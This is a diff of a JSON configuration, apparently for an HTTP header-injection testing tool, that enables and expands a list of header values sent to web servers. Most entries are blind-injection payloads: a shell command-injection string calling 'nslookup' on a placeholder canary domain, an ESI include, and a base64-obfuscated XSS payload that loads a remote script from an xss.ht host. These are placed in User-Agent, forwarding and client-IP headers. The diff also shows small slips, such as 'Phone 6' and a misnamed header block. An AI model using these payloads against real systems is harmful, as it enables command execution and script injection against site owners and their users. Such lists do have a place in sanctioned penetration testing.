@@ -1,63 +1,82 @@
 {
-    "1":{
-       "Disabled":true,
-       "HeaderName":"user-agent",
-       "HeaderValues":[
-          "Samsung Galaxy S4=Mozilla/5.0 (Linux; Android 4.2.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36",
-          "iPhone 6=Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1",
-          "IE6=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
-          "Googlebot 2.1=Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-          "Baidu Spider(PC)=Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
-          "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'",
-          "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"
-       ]
-    },
-    "2":{
-       "Disabled":true,
-       "HeaderName":"accept-language",
-       "HeaderValues":[
-          "en",
-          "el",
-          "fr",
-          "jp",
-          "de",
-          "es"
-       ]
-    },
-    "3":{
-       "Disabled":true,
-       "HeaderName":"X-Forwarded-For",
-       "HeaderValues":[
-          "127.0.0.1",
-          "localhost",
-          "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'",
-          "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"
-       ]
-    },
-    "4":{
-       "Disabled":true,
-       "HeaderName":"X-Forwarded-Host",
-       "HeaderValues":[
-          "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'",
-          "<esi:include src=http://<Y0uRcanAryDoma1n>>"
-       ]
-    },
-    "5":{
-       "Disabled":true,
-       "HeaderName":"Origin",
-       "HeaderValues":[
-          "https://<Y0uRcanAryDoma1n>/"
-       ]
-    },
-    "6":{
-       "Disabled":true,
-       "HeaderName":"Referrer",
-       "HeaderValues":[
-          "https://<Y0uRcanAryDoma1n>",
-          "<Y0uRcanAryDoma1n>",
-          "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'",
-          "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>",
-          "<esi:include src=http://<Y0uRcanAryDoma1n>>"
-       ]
-    }
- }
+   "1": {
+      "Disabled": false,
+      "HeaderName": "user-agent",
+      "HeaderValues": ["Samsung Galaxy S4=Mozilla/5.0 (Linux; Android 4.2.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36", "Phone 6=Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1", "IE6=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)", "Googlebot 2.1=Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Baidu Spider(PC)=Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)", "&nslookup <Y0uRcanAryDoma1n>&'\\\\\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\\\"><input onfocus=eval(atob(this.id)) id=\\\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\\\" autofocus>"]
+   },
+   "2": {
+      "Disabled": false,
+      "HeaderName": "accept-language",
+      "HeaderValues": ["en", "el", "es", "fr", "de"]
+   },
+   "3": {
+      "Disabled": true,
+      "HeaderName": "user-agent",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "4": {
+      "Disabled": true,
+      "HeaderName": "X-Forwarded-Host",
+      "HeaderValues": ["&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "<esi:include src=http://<Y0uRcanAryDoma1n>>"]
+   },
+   "5": {
+      "Disabled": true,
+      "HeaderName": "Origin",
+      "HeaderValues": ["https://<Y0uRcanAryDoma1n>/"]
+   },
+   "6": {
+      "Disabled": true,
+      "HeaderName": "Referrer",
+      "HeaderValues": ["https://<Y0uRcanAryDoma1n>", "<Y0uRcanAryDoma1n>", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>", "<esi:include src=http://<Y0uRcanAryDoma1n>>"]
+   },
+   "8": {
+      "Disabled": true,
+      "HeaderName": "X-Real-IP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "9": {
+      "Disabled": true,
+      "HeaderName": "True-Client-IP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "10": {
+      "Disabled": true,
+      "HeaderName": "CF-Connecting-IP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "11": {
+      "Disabled": true,
+      "HeaderName": "X-Client-IP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "12": {
+      "Disabled": true,
+      "HeaderName": "Forwarded-For",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "13": {
+      "Disabled": true,
+      "HeaderName": "Fastly-Client-IP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "14": {
+      "Disabled": true,
+      "HeaderName": "X-Azure-ClientIP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "15": {
+      "Disabled": true,
+      "HeaderName": "X-Azure-SocketIP",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "16": {
+      "Disabled": true,
+      "HeaderName": "Forwarded",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   },
+   "18": {
+      "Disabled": true,
+      "HeaderName": "X-ClientId",
+      "HeaderValues": ["127.0.0.1", "localhost", "&nslookup <Y0uRcanAryDoma1n>&'\\\"`0&nslookup <Y0uRcanAryDoma1n>&`'", "\"><input onfocus=eval(atob(this.id)) id=\"dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vWTB1clhzc0hUU3ViZG9tYWluLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=\" autofocus>"]
+   }
+}
